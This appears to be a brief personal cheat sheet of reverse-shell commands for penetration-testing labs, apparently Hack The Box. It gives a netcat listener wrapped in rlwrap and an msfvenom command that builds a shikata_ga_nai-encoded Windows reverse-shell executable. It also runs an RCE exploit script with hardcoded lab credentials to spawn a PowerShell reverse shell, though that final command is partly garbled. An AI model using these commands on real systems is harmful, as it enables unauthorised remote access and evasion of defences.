## `rlwrap` with Netcat Listner

```bash
rlwrap -f . -r nc -nvlp 4444
```

## Windows

```
msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```



### Windows RCE rev shell Payload
This is how we can get the revese shell once we are able to run command in windows using rce the base 64 code is the code generated by reveshellgenertor online website for reverseshell

```bash
python3 http://49488.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe "powershell -e "
```
